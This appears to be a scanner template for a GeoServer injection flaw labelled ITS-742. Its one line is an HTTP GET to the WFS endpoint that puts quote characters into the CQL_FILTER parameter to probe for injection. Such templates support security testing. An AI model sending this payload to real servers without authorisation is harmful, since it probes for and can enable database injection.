# Vulnerable: ITS-742
GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&CQL_FILTER=strStartswith({{column}},%27%27%27%27)=true
